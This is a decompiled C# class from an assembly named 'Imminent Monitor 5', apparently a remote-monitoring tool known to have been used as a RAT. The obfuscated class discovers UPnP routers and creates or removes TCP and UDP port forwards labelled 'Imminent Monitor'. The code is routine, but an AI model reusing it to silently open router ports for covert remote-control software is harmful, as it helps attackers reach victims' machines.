// Decompiled with JetBrains decompiler
// Type: GClass25
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using Mono.Nat;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

public sealed class GClass25
{
  private GClass25.GDelegate8 gdelegate8_0;
  public bool bool_0;
  private INatDevice inatDevice_0;

  public GClass25() => this.bool_0 = false;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(GClass25.GDelegate8 gdelegate8_1) => this.gdelegate8_0 += gdelegate8_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(GClass25.GDelegate8 gdelegate8_1) => this.gdelegate8_0 -= gdelegate8_1;

  public INatDevice method_2() => this.inatDevice_0;

  public void method_3(INatDevice inatDevice_1) => this.inatDevice_0 = inatDevice_1;

  public void method_4()
  {
    try
    {
      NatUtility.DeviceFound += new EventHandler<DeviceEventArgs>(this.method_6);
      NatUtility.StartDiscovery();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public void method_5()
  {
    try
    {
      NatUtility.StopDiscovery();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_6(object sender, DeviceEventArgs e)
  {
    if (!((object) e.Device).ToString().ToLower().Contains("upnp"))
      return;
    this.method_3(e.Device);
    this.bool_0 = true;
    GClass25.GDelegate8 gdelegate80 = this.gdelegate8_0;
    if (gdelegate80 == null)
      return;
    gdelegate80(e.Device);
  }

  public List<object> method_7()
  {
    List<object> objectList = new List<object>();
    foreach (Mapping allMapping in this.method_2().GetAllMappings())
    {
      if (allMapping.PublicPort != 0)
        objectList.Add((object) allMapping);
    }
    return objectList;
  }

  public bool method_8(ushort ushort_0)
  {
    bool flag;
    try
    {
      this.method_2().CreatePortMap(new Mapping((Protocol) 0, (int) ushort_0, (int) ushort_0)
      {
        Description = "Imminent Monitor TCP (" + Conversions.ToString((uint) ushort_0) + ")"
      });
      this.method_2().CreatePortMap(new Mapping((Protocol) 1, (int) ushort_0, (int) ushort_0)
      {
        Description = "Imminent Monitor UDP (" + Conversions.ToString((uint) ushort_0) + ")"
      });
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public bool method_9(Mapping mapping_0)
  {
    bool flag;
    try
    {
      this.method_2().DeletePortMap(mapping_0);
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public delegate void GDelegate8(INatDevice inatDevice_0);
}
